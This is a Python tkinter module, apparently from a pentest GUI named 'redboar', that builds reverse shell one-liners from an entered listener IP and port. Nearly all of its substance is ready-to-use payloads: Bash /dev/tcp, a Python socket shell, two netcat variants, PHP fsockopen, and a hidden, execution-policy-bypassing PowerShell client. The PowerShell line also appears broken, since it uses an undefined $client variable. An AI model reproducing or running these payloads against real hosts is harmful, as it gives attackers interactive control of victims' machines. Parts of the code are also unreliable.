import tkinter as tk
from tkinter import ttk
import logging

logger = logging.getLogger("redboar")

def create_ui(parent_frame, app_instance):
    parent_frame.columnconfigure(1, weight=1)

    info = ttk.Label(parent_frame, text="Generate reverse shell one-liners. Copy to clipboard.", padding=5)
    info.grid(row=0, column=0, columnspan=2)

    # Inputs
    ttk.Label(parent_frame, text="LHOST (Your IP):").grid(row=1, column=0, sticky="w", padx=5)
    app_instance.rev_ip_var = tk.StringVar(value="10.10.x.x")
    ip_entry = ttk.Entry(parent_frame, textvariable=app_instance.rev_ip_var, width=20)
    ip_entry.grid(row=1, column=1, sticky="w", padx=5)
    ip_entry.bind("<KeyRelease>", lambda e: update_shells(app_instance))

    ttk.Label(parent_frame, text="LPORT:").grid(row=2, column=0, sticky="w", padx=5)
    app_instance.rev_port_var = tk.StringVar(value="4444")
    port_entry = ttk.Entry(parent_frame, textvariable=app_instance.rev_port_var, width=10)
    port_entry.grid(row=2, column=1, sticky="w", padx=5)
    port_entry.bind("<KeyRelease>", lambda e: update_shells(app_instance))

    # Shell Type Selector (Optional, we list all)
    
    # Text Area for Output
    app_instance.rev_output_text = tk.Text(parent_frame, height=15, width=80)
    app_instance.rev_output_text.grid(row=3, column=0, columnspan=2, padx=5, pady=10, sticky="nsew")
    parent_frame.rowconfigure(3, weight=1)

    # Initial pop
    update_shells(app_instance)

def update_shells(app):
    ip = app.rev_ip_var.get()
    port = app.rev_port_var.get()
    
    shells = []
    
    shells.append(f"--- Bash TCP ---")
    shells.append(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")
    
    shells.append(f"\n--- Python ---")
    shells.append(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
    
    shells.append(f"\n--- Netcat (traditional) ---")
    shells.append(f"nc -e /bin/sh {ip} {port}")
    
    shells.append(f"\n--- Netcat (OpenBSD) ---")
    shells.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")
    
    shells.append(f"\n--- PHP ---")
    shells.append(f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    
    shells.append(f"\n--- PowerShell ---")
    shells.append(f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()")

    content = "\n".join(shells)
    
    app.rev_output_text.delete("1.0", "end")
    app.rev_output_text.insert("1.0", content)

def build_command(app_instance):
    # Not runnable via run button in standard way, but we return dummy list
    return ["echo", "Copy payload from text area"]
